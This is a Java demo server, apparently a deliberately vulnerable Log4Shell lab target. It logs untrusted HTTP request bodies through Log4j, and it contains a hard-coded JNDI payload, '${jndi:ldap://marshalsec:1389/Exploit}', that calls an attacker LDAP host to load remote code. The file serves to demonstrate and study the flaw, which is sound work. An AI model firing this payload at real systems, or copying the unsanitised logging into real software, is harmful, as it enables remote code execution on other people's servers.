import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;

import com.google.common.base.Charsets;
import com.google.common.io.CharStreams;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;


public class log4j {
    private static final Logger logger = LogManager.getLogger(log4j.class);

    static class RootHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange t) throws IOException {
            System.out.println("Received new request");

            InputStream is = t.getRequestBody();
            String body = CharStreams.toString(new InputStreamReader(is, Charsets.UTF_8));    

            System.out.printf("Logging body content: %s\n", body);
            logger.error(body);

            String response = "OK";
            t.sendResponseHeaders(200, response.length());
            OutputStream os = t.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }
    }

    public static void main(String[] args) throws IOException {
        logger.error("${jndi:ldap://marshalsec:1389/Exploit}");
        HttpServer server = HttpServer.create(new InetSocketAddress(8080), 0);
        server.createContext("/", new RootHandler());
        server.setExecutor(null); // creates a default executor

        System.out.println("Starting HTTP server on port 8080");
        server.start();
    }
}
